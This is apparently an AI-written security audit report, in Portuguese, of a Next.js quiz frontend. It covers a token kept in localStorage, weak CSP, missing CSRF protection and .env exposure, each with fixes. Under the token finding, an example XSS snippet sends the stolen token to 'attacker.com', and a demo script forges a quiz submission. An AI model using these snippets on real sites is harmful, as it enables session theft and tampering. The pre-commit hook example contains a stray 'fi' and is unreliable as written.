# Auditoria de Segurança - Quiz Mensal Interface
**Data:** 2025-10-07 | **Auditor:** Claude Security Expert | **Escopo:** quiz-mensal-interface

---

## 📋 SUMÁRIO EXECUTIVO

### Status: ⚠️ MÉDIO-ALTO (6.5/10)

**Vulnerabilidades Identificadas:**
- 🔴 1 ALTA: Token em localStorage (CWE-522, CVSS 7.5)
- 🟠 3 MÉDIAS: CSP unsafe directives, CSRF ausente, .env exposto
- 🟡 2 BAIXAS: Input validation, logging insuficiente

**Dependências:** ✅ 0 vulnerabilidades (npm audit clean)

---

## 🔍 1. ANÁLISE DE DEPENDÊNCIAS

```json
{
  "vulnerabilities": { "total": 0, "critical": 0, "high": 0, "moderate": 0, "low": 0 },
  "dependencies": { "total": 682, "prod": 216, "dev": 457 }
}
```

**Status:** ✅ APROVADO

**Dependências Críticas:**
- isomorphic-dompurify@2.28.0 ✅ Atualizada
- next@14.2.33 ✅ Versão estável
- zod@3.25.67 ✅ Schema validation OK

**Recomendações:**
- Implementar Dependabot/Renovate
- Executar npm audit no CI/CD
- Revisão mensal de dependências

---

## 🛡️ 2. PROTEÇÃO XSS

### VULN-XSS-001: CSP com 'unsafe-inline' e 'unsafe-eval'
**Severidade:** MÉDIA | **CVSS:** 5.3 | **CWE:** CWE-79

**Localização:** next.config.mjs:60

**Código Vulnerável:**
```javascript
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.gstatic.com;
```

**Impacto:**
- Permite scripts inline maliciosos
- Reduz eficácia da CSP contra XSS
- Facilita ataques via bibliotecas comprometidas

**Remediação:**
```javascript
// Usar nonce-based CSP
const nonce = crypto.randomBytes(16).toString('base64')
headers: [{
  key: 'Content-Security-Policy',
  value: `script-src 'self' 'nonce-${nonce}' https://www.gstatic.com; style-src 'self' 'nonce-${nonce}';`
}]
```

**Referências:** OWASP CSP Cheat Sheet, MDN CSP Guide

---

### VULN-XSS-002: Textarea sem validação de tamanho
**Severidade:** BAIXA | **CVSS:** 3.1 | **CWE:** CWE-20

**Localização:** components/quiz/QuestionRenderer/TextQuestion.tsx

**Remediação:**
```typescript
const MAX_TEXT_LENGTH = 5000
<Textarea
  value={selectedAnswer as string || ""}
  onChange={(e) => {
    if (e.target.value.length <= MAX_TEXT_LENGTH) onAnswerChange(e.target.value)
  }}
  maxLength={MAX_TEXT_LENGTH}
/>
<p>{(selectedAnswer as string || "").length} / {MAX_TEXT_LENGTH}</p>
```

**Pontos Fortes:**
- ✅ DOMPurify implementado corretamente (chart.tsx:105-109)
- ✅ React auto-escaping em todos os componentes
- ✅ Nenhum uso de innerHTML/eval/document.write detectado

---

## 🔒 3. GESTÃO DE TOKENS

### VULN-AUTH-001: Token em localStorage (CRÍTICO)
**Severidade:** ALTA | **CVSS:** 7.5 | **CWE:** CWE-522

**Localização:** app/page.tsx:31,53 | components/quiz-interface.tsx:39,129

**Código Vulnerável:**
```typescript
localStorage.setItem('quiz_token', session.new_token)
urlToken = localStorage.getItem('quiz_token')
```

**Impacto:**
- Token acessível via JavaScript (vulnerável a XSS)
- Persistência após fechamento do navegador
- Vulnerável a extensões maliciosas
- Sem proteção CSRF

**Vetor de Ataque:**
```javascript
// XSS rouba token:
const stolen = localStorage.getItem('quiz_token')
fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify({token: stolen}) })
```

**Remediação (httpOnly Cookies):**

Backend (FastAPI):
```python
from fastapi import Response

@app.post("/api/v1/monthly-quiz-public/access")
async def access_quiz(request: QuizAccessRequest, response: Response):
    session = await validate_session(request.token)
    new_token = generate_token(session.id)
    
    response.set_cookie(
        key="quiz_session", value=new_token,
        httponly=True, secure=True, samesite="strict",
        max_age=3600, path="/api/v1/monthly-quiz-public"
    )
    return session_data
```

Frontend (Next.js):
```typescript
// lib/api.ts
async accessQuiz(token: string): Promise<QuizSession> {
  const response = await fetch(`${this.baseURL}/access`, {
    method: "POST",
    credentials: 'include',  // Envia cookies automaticamente
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ token }),
  })
  return await response.json()
}

// REMOVER: localStorage.setItem/getItem('quiz_token')
```

**Pontos Fortes:**
- ✅ Token rotation implementado (reduz janela de ataque)
- ✅ Token expiration validado (client + server)

**Referências:** OWASP Session Management, CWE-522

---

## 🚫 4. PROTEÇÃO CSRF

### VULN-CSRF-001: CSRF Protection ausente
**Severidade:** MÉDIA | **CVSS:** 6.5 | **CWE:** CWE-352

**Localização:** lib/api.ts (todas chamadas POST)

**Impacto:**
- Atacante pode submeter respostas em nome do usuário
- Manipulação de dados do quiz
- Sem validação de origem das requisições

**Ataque Demonstrativo:**
```html
<script>
  const token = localStorage.getItem('quiz_token')
  fetch('https://api.clinica.com/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({token, question_id: 'q1', response_value: 'Manipulado'})
  })
</script>
```

**Remediação (CSRF Token):**

Backend:
```python
import secrets, hmac

def generate_csrf_token(session_id: str) -> str:
    return hmac.new(
        settings.CSRF_SECRET.encode(), 
        session_id.encode(), 
        'sha256'
    ).hexdigest()

@app.post("/submit")
async def submit(x_csrf_token: str = Header(None), quiz_session: str = Cookie(None)):
    if not verify_csrf_token(session_id, x_csrf_token):
        raise HTTPException(403, "Invalid CSRF")
    # Processar...
```

Frontend:
```typescript
function getCookie(name: string): string | null {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  return parts.length === 2 ? parts.pop()?.split(';').shift() || null : null
}

async submitAnswer(...): Promise<QuizSubmitResponse> {
  const csrfToken = getCookie('csrf_token')
  if (!csrfToken) throw new Error('CSRF token missing')
  
  const response = await fetch(`${this.baseURL}/submit`, {
    method: "POST",
    credentials: 'include',
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken
    },
    body: JSON.stringify(submitData),
  })
  return await response.json()
}
```

**Alternativa:** SameSite=Strict cookies (mais simples)

**Referências:** OWASP CSRF Prevention, CWE-352

---

## 📁 5. EXPOSIÇÃO DE DADOS SENSÍVEIS

### VULN-DATA-001: Arquivo .env presente
**Severidade:** ALTA (se commitado) | **CVSS:** 7.5 | **CWE:** CWE-200

**Detecção:**
```bash
$ cd quiz-mensal-interface && ls -la | grep .env
WARNING: .env file exists

$ cat .gitignore | grep "\.env$"
# (sem resultado explícito para .env)
```

**.gitignore Atual:**
```gitignore
.env*  # Protege .env.local, mas pode não proteger .env exato
```

**.gitignore Recomendado:**
```gitignore
# Environment files (EXPLICIT)
.env
.env.local
.env.development.local
.env.test.local
.env.production.local
.env*.local

# Secrets
*.key
*.pem
*.p12
secrets.json
credentials.json
```

**Ação Imediata:**
1. Verificar se .env foi commitado:
```bash
git log --all --full-history -- .env
git log --all --full-history -- "*.env"
```

2. Se commitado, remover do histórico:
```bash
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch .env" \
  --prune-empty -- --all
git push origin --force --all
# ROTACIONAR TODAS AS CREDENCIAIS
```

3. Adicionar pre-commit hook:
```bash
# .git/hooks/pre-commit
#!/bin/bash
if git diff --cached --name-only | grep -E '\.(env|key|pem)$'; then
  echo "ERROR: Tentativa de commit de arquivo sensível!"
  exit 1
fi
fi
chmod +x .git/hooks/pre-commit
```

**Pontos Fortes:**
- ✅ Uso de NEXT_PUBLIC_ prefix (env vars claramente marcadas)
- ✅ Debug mode controlado (process.env.NEXT_PUBLIC_DEBUG_MODE)

**Referências:** OWASP Sensitive Data Exposure, GitHub Secret Scanning

---

## 🔐 6. SANITIZAÇÃO DE INPUTS

**Status:** ✅ BOM (com melhorias sugeridas)

**Pontos Fortes:**
- ✅ React auto-escaping em todos os componentes
- ✅ DOMPurify para chart.tsx (única exceção)
- ✅ TypeScript type-safe
- ✅ Validação de schema esperada (Zod)

**Sugestão:** Adicionar validação frontend com Zod

```typescript
// lib/validators.ts (NOVO)
import { z } from 'zod'

export const QuizResponseSchema = z.object({
  question_id: z.string().uuid(),
  response_value: z.union([
    z.string().max(5000),
    z.array(z.string()).max(20)
  ]),
  other_text: z.string().max(1000).optional(),
})

// Usar em lib/api.ts:
async submitAnswer(token, questionId, responseValue, metadata) {
  const validated = QuizResponseSchema.parse({
    question_id: questionId,
    response_value: responseValue,
    other_text: metadata?.other_text
  })
  // Enviar validated data...
}
```

---

## 🌐 7. HTTPS/TLS

**Status:** ⚠️ Depende de configuração Railway

**CSP Atual:**
```
connect-src 'self' https://clinica-oncologica-v02-production.up.railway.app wss://...
```
- ✅ Requer HTTPS
- ✅ WebSocket seguro (wss://)
- ⚠️ Depende de config Railway

**Headers Faltando:**
```javascript
// next.config.mjs (ADICIONAR):
{
  key: 'Strict-Transport-Security',
  value: 'max-age=31536000; includeSubDomains; preload'
}
```

**Railway Config:**
```yaml
# railway.toml
[environment]
FORCE_HTTPS = "true"
HSTS_MAX_AGE = "31536000"
```

---

## 📊 8. RESUMO OWASP TOP 10

| Categoria | Status | Vulnerabilidades |
|-----------|--------|------------------|
| A01: Broken Access Control | ⚠️ | VULN-AUTH-001 |
| A02: Cryptographic Failures | ⚠️ | VULN-DATA-001 |
| A03: Injection | ✅ | Nenhuma |
| A04: Insecure Design | ⚠️ | VULN-CSRF-001 |
| A05: Security Misconfiguration | ⚠️ | VULN-XSS-001 |
| A06: Vulnerable Components | ✅ | npm audit clean |
| A07: Identification/Auth | ⚠️ | VULN-AUTH-001 |
| A08: Software Integrity | ✅ | OK |
| A09: Security Logging | ⚠️ | Apenas debug |
| A10: SSRF | N/A | Frontend |

---

## 🎯 9. PLANO DE REMEDIAÇÃO

### 🔴 CRÍTICO (1 semana)

1. **VULN-AUTH-001:** Migrar para httpOnly cookies
   - Impacto: Alto | Esforço: 4-8h
   - CVEs: CVE-2019-11730, CVE-2018-18500

2. **VULN-DATA-001:** Verificar e proteger .env
   - Impacto: Alto | Esforço: 1h

### 🟠 ALTO (2-4 semanas)

3. **VULN-CSRF-001:** Implementar CSRF protection
   - Impacto: Médio | Esforço: 6-10h

4. **VULN-XSS-001:** Fortalecer CSP
   - Impacto: Médio | Esforço: 10-16h

### 🟡 MÉDIO (1-2 meses)

5. **VULN-XSS-002:** Validação de tamanho
   - Impacto: Baixo | Esforço: 2h

6. **Rate limiting** no cliente
   - Impacto: Médio | Esforço: 4h

---

## ✅ 10. CHECKLIST DE SEGURANÇA

### Deployment
- [ ] npm audit sem vulnerabilidades
- [ ] .env não commitado
- [ ] HTTPS habilitado
- [ ] CSP sem unsafe-inline/eval
- [ ] CSRF protection
- [ ] httpOnly cookies
- [ ] Rate limiting
- [ ] Logs de segurança

### Development
- [ ] Pre-commit hooks
- [ ] ESLint security plugin
- [ ] Code review obrigatório
- [ ] Testes de segurança
- [ ] Dependências atualizadas
- [ ] Documentação atualizada

---

## 📝 11. CONCLUSÃO

**Score:** 6.5/10 (MÉDIO) → Alvo: 9.0/10 (ALTO)

**Forças:**
- ✅ Dependências sem vulnerabilidades
- ✅ DOMPurify implementado
- ✅ Headers de segurança básicos
- ✅ Type safety

**Fraquezas:**
- 🔴 Tokens em localStorage
- 🔴 CSRF ausente
- 🟠 CSP unsafe directives
- 🟠 .env potencialmente exposto

**Próximos Passos:**
1. Semana 1: Migrar para httpOnly cookies
2. Semana 2: CSRF protection
3. Semana 3-4: Fortalecer CSP
4. Mês 2: Monitoring e alertas

---

## 📚 REFERÊNCIAS

**Ferramentas:**
- Snyk, OWASP ZAP, Burp Suite
- npm audit, Dependabot, Renovate
- git-secrets, truffleHog

**Documentação:**
- OWASP Top 10 2021
- OWASP Cheat Sheet Series
- NIST NVD, MITRE CVE

**Comandos:**
```bash
# Verificar vulnerabilidades
npm audit --production

# Escanear secrets
git log --all -- .env

# Testar CSP
curl -I https://quiz.clinica.com | grep Content-Security

# Verificar cookies
curl -v https://api.clinica.com/access -c cookies.txt
```

---

**Auditoria:** Claude Security Expert  
**Data:** 2025-10-07  
**Próxima revisão:** 2025-11-07

**FIM DO RELATÓRIO**
